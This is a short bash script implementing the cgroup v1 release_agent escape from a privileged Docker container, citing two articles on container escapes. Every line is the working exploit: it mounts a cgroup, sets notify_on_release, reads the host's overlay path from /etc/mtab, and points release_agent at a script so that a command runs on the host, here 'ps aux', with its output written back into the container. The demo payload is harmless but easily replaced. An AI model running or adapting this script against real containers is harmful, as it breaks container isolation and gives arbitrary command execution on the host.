#!/bin/bash -x
# see https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1
# see https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
cat /etc/mtab
cat /proc/self/mounts
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
